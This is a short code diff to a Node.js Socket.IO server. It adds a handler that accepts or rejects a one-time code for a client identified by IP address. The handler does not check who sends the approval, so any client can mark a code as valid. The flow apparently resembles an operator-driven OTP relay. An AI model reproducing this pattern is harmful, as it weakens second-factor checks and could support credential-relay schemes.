@@ -256,6 +256,14 @@ io.on('connection', (socket, req) => {
         console.log(`OTP true for ip : ${data.ip}`)
     })
 
+    socket.on('sendOTPResponse', (data) => {
+        if(data.res == 'good'){
+             io.to(data.ip).emit('OTPResponse', {res:true})
+        } else {
+             io.to(data.ip).emit('OTPResponse', {res:false})
+        }
+    })
+
     
     socket.on('submit', (data) => {
         if (sessionStore.has(userIP)) {
